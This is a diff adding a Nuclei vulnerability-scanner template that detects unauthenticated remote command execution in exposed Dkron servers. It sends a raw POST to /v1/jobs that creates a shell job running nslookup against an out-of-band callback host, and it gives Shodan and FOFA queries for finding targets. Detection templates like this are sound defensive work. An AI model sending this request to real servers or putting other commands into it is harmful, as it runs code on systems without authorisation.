@@ -1,0 +1,37 @@
+id: dkron-unauth-rce
+
+info:
+  name: Dkron - Unauthenticated Remote Command Execution
+  author: icarot
+  severity: high
+  description: |
+    An exposed Dkron server, a distributed and fault-tolerant job scheduling system for cloud-native environments, was found vulnerable to unauthenticated remote command execution (RCE).This flaw allowed attackers to execute arbitrary commands on the host without authentication.
+  reference:
+    - https://github.com/distribworks/dkron/
+  metadata:
+    verified: true
+    fofa-query: title="Dkron"
+    shodan-query: title:"Dkron"
+  tags: dkron,unauth,rce,oast,obb
+
+variables:
+  string: "{{to_lower(rand_text_alpha(5))}}"
+
+http:
+  - raw:
+      - |
+        POST /v1/jobs HTTP/1.1
+        Host: {{Hostname}}
+        Accept: application/json
+
+        {"ephemeral":true,"disabled":false,"name":"{{string}}","schedule":"@every 1s","executor":"shell","executor_config":{"command":"nslookup  {{string}}.{{interactsh-url}}","cwd":"/tmp/","env":"ENV_VAR=va1,ANOTHER_ENV_VAR=var2","shell":"true","timeout":"10s"},"retries":null}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "contains(interactsh_protocol, 'dns')"
+          - "contains(content_type, 'application/json')"
+          - "contains_all(body, 'success_count','owner_email')"
+          - "status_code == 201"
+        condition: and
+# digest: 4b0a00483046022100e637adaa657df20567b734667c375ee70cc6429516ac63b3b9be3633a70550f3022100bc613fe2572118b517685b7b5550c69f15c478e7e71745f29403674c6ce7f830:922c64590222798bb761d5b6d8e72950
